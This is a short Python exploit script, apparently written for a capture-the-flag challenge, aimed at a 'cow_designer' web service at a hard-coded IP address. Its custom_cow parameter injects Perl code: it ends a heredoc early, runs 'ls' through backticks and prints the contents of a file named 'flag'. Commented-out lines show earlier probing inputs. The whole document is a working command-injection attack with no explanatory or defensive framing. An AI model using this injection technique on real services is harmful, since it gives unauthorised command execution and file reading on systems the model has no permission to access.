import requests

from bs4 import BeautifulSoup

url = 'http://3.93.128.89:1204/cow_designer'
params = {'message': '', 'custom_cow': 'EOC\nprint `ls`;\nopen (FH, "flag");\nprint (<FH>);', 'eyes': '', 'tongue': ''}

# params['message'] = 'A'*1000000  # causes error
# params['message'] = '--help'
# params['message'] = '"test'
# params['message'] = '%3B'

response = requests.post(url, data = params)
# print(response.content)
soup = BeautifulSoup(response.content, 'html.parser')
print(soup.prettify())